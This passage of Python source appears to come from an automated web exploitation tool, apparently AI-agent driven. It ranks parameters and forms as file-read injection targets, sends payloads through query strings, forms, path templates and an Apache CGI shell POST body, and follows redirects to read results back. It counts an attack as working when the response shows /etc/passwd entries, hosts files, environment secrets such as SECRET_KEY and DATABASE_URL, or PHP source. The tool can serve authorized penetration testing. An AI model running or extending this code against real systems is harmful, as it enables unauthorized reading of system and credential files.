                    "sources": _string_items(param.get("sources")),
                    "hints": _string_items(param.get("hints")),
                    "priority": _int_value(param.get("priority")),
                }
            )
            seen.add((name, location))
    origin = str(state.surface.get("origin") or state.surface.get("target_url") or "")
    signal_endpoints = [url for url in (str(value) for value in state.signals.get("endpoints", [])) if _url_in_scope(url, origin)]
    if not signal_endpoints and state.surface.get("target_url"):
        signal_endpoints = [str(state.surface.get("target_url") or "")]
    for name in state.signals.get("parameters", []):
        text = str(name)
        if not text:
            continue
        for location in signal_endpoints[:6]:
            key = (text, location)
            if key in seen:
                continue
            seen.add(key)
            targets.append(
                {
                    "kind": "query_param",
                    "name": text,
                    "input": text,
                    "url": location,
                    "sources": ["signal"],
                    "hints": [],
                    "priority": 18,
                }
            )
    return targets[:limit]


def _target_looks_file_read_candidate(target: dict[str, object]) -> bool:
    name = _target_input_name(target).lower()
    hints = " ".join(item.lower() for item in _string_items(target.get("hints")))
    url = str(target.get("url") or "")
    value = _current_query_value(url, name).lower()
    if any(word in hints for word in ("file", "path", "url", "upload", "xml", "structured")):
        return True
    if name in set(_SYNTHETIC_FILE_PARAM_NAMES):
        return True
    if name in {"id", "doc", "document", "post", "article"} and _value_looks_file_name(value):
        return True
    return _value_looks_file_name(value) and str(urlsplit(url).path).lower().endswith((".php", ".asp", ".aspx", ".jsp"))


def _file_target_priority(target: dict[str, object]) -> int:
    name = _target_input_name(target).lower()
    url = str(target.get("url") or "").lower()
    score = _int_value(target.get("priority"))
    if target.get("synthetic"):
        score -= 110
    elif _target_has_observed_location(target):
        score += 35
    if str(target.get("kind") or "") in {"direct_path", "apache_cgi_shell"}:
        score += 120
    if any(word in " ".join(item.lower() for item in _string_items(target.get("hints"))) for word in ("file", "path")):
        score += 80
    if name == "file":
        score += 90
    elif name in {"page", "include", "template", "view", "content"}:
        score += 75
    elif name in {"path", "doc", "document"}:
        score += 65
    elif name == "filename":
        score += 60
    elif name in {"url", "uri", "redirect", "next"}:
        score += 55
    if _target_looks_static_resource_selector(target):
        score += 130
    if name == "id" and _value_looks_file_name(_current_query_value(url, name)):
        score += 105
    if ".php" in url:
        score += 12
    if target.get("fallback"):
        score -= 35
    return score


def _target_dedupe_url(target: dict[str, object]) -> str:
    url = str(target.get("url") or "")
    try:
        parts = urlsplit(url)
    except ValueError:
        return url
    return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", "", ""))


def _target_has_observed_location(target: dict[str, object]) -> bool:
    if str(target.get("kind") or "") == "form":
        return True
    sources = {item.lower() for item in _string_items(target.get("sources"))}
    if sources and "synthetic_file_param" not in sources:
        return True
    try:
        return bool(urlsplit(str(target.get("url") or "")).query)
    except ValueError:
        return False


def _send_target(session: ProbeSession, target: dict[str, object], value: str) -> ProbeResponse:
    kind = str(target.get("kind") or "query_param")
    url = str(target.get("url") or session.target_url)
    input_name = _target_input_name(target)
    if kind == "direct_path":
        return session.get(_direct_path_url(target, value))
    if kind == "apache_cgi_shell":
        return session.request(
            "POST",
            url,
            data=_apache_cgi_shell_body(value).encode("utf-8"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
    if kind == "form" and isinstance(target.get("form"), dict):
        from ravage.web_core.http_probe import form_defaults

        form = _dict_value(target.get("form"))
        fields = form_defaults(form, marker_name=input_name, marker=value)
        method = str(form.get("method") or "GET").upper()
        if method == "POST":
            return session.post_form(url, fields, headers=_optional_headers(_form_auth_headers(form)))
        query_url = url
        for key, raw in fields.items():
            query_url = inject_query_param(query_url, key, raw)
        return session.get(query_url, headers=_optional_headers(_form_auth_headers(form)))
    method = str(target.get("method") or "GET").upper()
    if method == "POST":
        fields = {key: str(raw) for key, raw in _dict_value(target.get("fields")).items()}
        fields[input_name] = value
        return session.post_form(url, fields)
    return session.get(inject_query_param(url, input_name, value))


def _direct_path_url(target: dict[str, object], value: str) -> str:
    template = str(target.get("path_template") or target.get("url") or "")
    return template.replace("{payload}", value.lstrip("/"))


def _apache_cgi_shell_body(path: str) -> str:
    return apache_cgi_read_body("/" + path.lstrip("/"))


def _send_primitive(session: ProbeSession, primitive: dict[str, object], payload: str) -> ProbeResponse:
    return _send_target(session, _dict_value(primitive.get("target")), payload)


def _follow_file_read_redirect(
    session: ProbeSession,
    response: ProbeResponse,
    *,
    budget: int,
) -> tuple[ProbeResponse, list[dict[str, object]], int]:
    if budget <= 0 or response.status not in {301, 302, 303, 307, 308}:
        return response, [], budget
    location = response.headers.get("location") or response.headers.get("Location") or ""
    if not location:
        return response, [], budget
    readback_url = session.absolute(location)
    if not session.in_scope(readback_url):
        return response, [], budget
    readback = session.get(readback_url)
    budget -= 1
    requests = [
        readback.summary(body_chars=360)
        | {
            "probe_kind": "file_read_redirect_readback",
            "redirect_from": response.url,
        }
    ]
    if not readback.body:
        return response, requests, budget
    headers = dict(response.headers)
    headers["readback-url"] = readback.final_url
    combined = ProbeResponse(
        method=response.method,
        url=response.url,
        status=readback.status,
        final_url=readback.final_url,
        elapsed_ms=response.elapsed_ms + readback.elapsed_ms,
        headers=headers,
        body=response.body + "\n\n<!-- redirect readback -->\n" + readback.body,
        error=response.error or readback.error,
    )
    return combined, requests, budget


def _primitive_from_target(target: dict[str, object], payload: str, signal: dict[str, object]) -> dict[str, object]:
    return {"target": _target_brief(target), "payload": payload, "signal": signal}


def _primitive_replay(primitive: dict[str, object], payload: str) -> dict[str, object]:
    target = _dict_value(primitive.get("target"))
    return _target_replay(target, payload)


def _target_replay(target: dict[str, object], value: str) -> dict[str, object]:
    url = str(target.get("url") or "")
    input_name = _target_input_name(target)
    if str(target.get("kind") or "") == "form":
        form = _dict_value(target.get("form"))
        replay: dict[str, object] = {
            "method": str(form.get("method") or "GET").upper(),
            "url": url,
            "payload_field": input_name,
        }
        headers = _form_auth_headers(form)
        if headers:
            replay["headers"] = headers
        return replay
    if str(target.get("kind") or "") == "direct_path":
        return {"method": "GET", "url": _direct_path_url(target, value), "payload_field": input_name}
    if str(target.get("kind") or "") == "apache_cgi_shell":
        return {
            "method": "POST",
            "url": url,
            "payload_field": input_name,
            "body": _apache_cgi_shell_body(value),
            "encoding": "application/x-www-form-urlencoded",
        }
    if str(target.get("method") or "GET").upper() == "POST":
        fields = {key: str(raw) for key, raw in _dict_value(target.get("fields")).items()}
        fields[input_name] = value
        return {
            "method": "POST",
            "url": url,
            "form": fields,
            "payload_field": input_name,
            "encoding": "application/x-www-form-urlencoded",
        }
    return {"method": "GET", "url": inject_query_param(url, input_name, value), "payload_field": input_name}


def _target_brief(target: dict[str, object]) -> dict[str, object]:
    brief: dict[str, object] = {
        "kind": str(target.get("kind") or "query_param"),
        "url": str(target.get("url") or ""),
        "input": _target_input_name(target),
        "hints": _string_items(target.get("hints")),
        "priority": _int_value(target.get("priority")),
    }
    if brief["kind"] == "form":
        form = _dict_value(target.get("form"))
        if form:
            brief["method"] = str(form.get("method") or "GET").upper()
            brief["form"] = _replayable_form_brief(form)
    if target.get("path_template"):
        brief["path_template"] = str(target.get("path_template") or "")
    for key in ("apache_family", "apache_depth", "apache_alias"):
        if target.get(key) is not None:
            brief[key] = target[key]
    if brief["kind"] == "apache_cgi_shell":
        brief["method"] = "POST"
    method = str(target.get("method") or "").upper()
    if method and brief["kind"] != "form":
        brief["method"] = method
    fields = _dict_value(target.get("fields"))
    if fields and brief["kind"] != "form":
        brief["fields"] = {str(key): str(value) for key, value in fields.items()}
    return brief


def _replayable_form_brief(form: dict[str, object]) -> dict[str, object]:
    brief: dict[str, object] = {
        "action": str(form.get("action") or ""),
        "method": str(form.get("method") or "GET").upper(),
        "enctype": str(form.get("enctype") or ""),
        "inputs": _list_of_dicts(form.get("inputs")),
        "categories": _string_items(form.get("categories")),
    }
    headers = _form_auth_headers(form)
    if headers:
        brief["auth_headers"] = headers
    return brief


def _baseline_value(target: dict[str, object]) -> str:
    name = _target_input_name(target).lower()
    current = _current_query_value(str(target.get("url") or ""), name)
    if current:
        return current
    if name in {"id", "page", "post", "article"}:
        return "1"
    return "ravage"


def _target_input_name(target: dict[str, object]) -> str:
    return str(target.get("input") or target.get("name") or "")


def _current_query_value(url: str, name: str) -> str:
    try:
        values = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    except ValueError:
        return ""
    for key, value in values:
        if key == name:
            return value
    return ""


def _value_looks_file_name(value: str) -> bool:
    return bool(re.search(r"\.[a-z0-9]{1,6}(?:$|[?#])", value.lower()))


def _passwd_like(body: str) -> bool:
    return "root:x:0:0:" in body and ("/bin/bash" in body or "/usr/sbin/nologin" in body)


def _passwd_users(body: str) -> list[str]:
    return re.findall(r"(?m)^([a-z_][a-z0-9_-]{0,31}):x:\d+:\d+:", body)


def _hosts_like(body: str) -> bool:
    return bool(re.search(r"(?m)^\s*127\.0\.0\.1\s+localhost\b", body)) or bool(
        re.search(r"(?m)^\s*::1\s+localhost\b", body)
    )


def _environ_like(body: str) -> bool:
    return len(_environment_keys(body)) >= 2


def _environment_keys(body: str) -> list[str]:
    keys = re.findall(r"\b(PATH|HOME|USER|HOSTNAME|PWD|SHELL|LANG|PYTHONPATH|DATABASE_URL|SECRET_KEY)=", body)
    return _dedupe(keys)


def _source_like(body: str) -> bool:
    lowered = body.lower()
    return any(marker in lowered for marker in ("<?php", "include", "require", "file_get_contents", "$_get", "$_post"))


def _php_surface(state: AgentState, primitive: dict[str, object]) -> bool:
    text = " ".join(
        [
            str(primitive).lower(),
            " ".join(state.signals.get("markers", ())).lower(),
            " ".join(state.signals.get("endpoints", ())).lower(),
            json.dumps(state.surface).lower(),
        ]
    )
    return "php" in text or "x-powered-by" in text or ".php" in text


def _form_targets(state: AgentState, *, limit: int) -> list[dict[str, object]]:
    forms = _list_of_dicts(state.surface.get("forms"))
    for value in state.signals.get("forms", []):
        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            continue
        if isinstance(decoded, dict):
            forms.append(decoded)
    origin = str(state.surface.get("origin") or state.surface.get("target_url") or "")
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for form in forms:
        if not _url_in_scope(str(form.get("action") or ""), origin):
            continue
        key = (
            str(form.get("method") or "GET").upper(),
            str(form.get("action") or ""),
            json.dumps(form.get("inputs") or [], sort_keys=True),
        )
        if key not in deduped:
            deduped[key] = form
    return list(deduped.values())[:limit]


def _url_in_scope(url: str, origin: str) -> bool:
    if not url or not origin:
        return True
    try:
        url_parts = urlsplit(url)
        origin_parts = urlsplit(origin)
    except ValueError:
        return False
    if not url_parts.scheme and not url_parts.netloc:
        return True
    return (url_parts.scheme, url_parts.netloc) == (origin_parts.scheme, origin_parts.netloc)


def _form_auth_headers(form: dict[str, object]) -> dict[str, str]:
    raw = form.get("auth_headers")
    if not isinstance(raw, dict):
        return {}
    headers: dict[str, str] = {}
    for key, value in raw.items():
        name = str(key).strip()
        text = str(value).strip()
        if name and text:
            headers[name] = text
    return headers


def _optional_headers(headers: dict[str, str]) -> dict[str, str] | None:
    return headers or None


def _form_input_names(form: dict[str, object]) -> list[str]:
    names: list[str] = []
    for input_field in _list_of_dicts(form.get("inputs")):
        name = str(input_field.get("name") or "")
        input_type = str(input_field.get("type") or "").lower()
        if name and input_type not in {"hidden", "submit", "button", "reset", "file"}:
            names.append(name)
    return names[:8]


def _dedupe(values: list[str]) -> list[str]:
    result: list[str] = []
    for value in values:
        if value and value not in result:
            result.append(value)
    return result


def _list_of_dicts(value: object) -> list[dict[str, object]]:
    if not isinstance(value, list):
        return []
    return [dict(item) for item in value if isinstance(item, dict)]


def _dict_value(value: object) -> dict[str, object]:
    if isinstance(value, dict):
        return cast(dict[str, object], value)
    return {}


def _string_items(value: object) -> list[str]:
    if not isinstance(value, list):
        return []
    return [str(item) for item in value if item]


def _int_value(value: object, default: int = 0) -> int:
    if value is None:
        return default
    if isinstance(value, bool):
        return int(value)
    if isinstance(value, int):
        return value
    if isinstance(value, float):
        return int(value)
    if isinstance(value, str) and value.strip():
        return int(value)
    return default
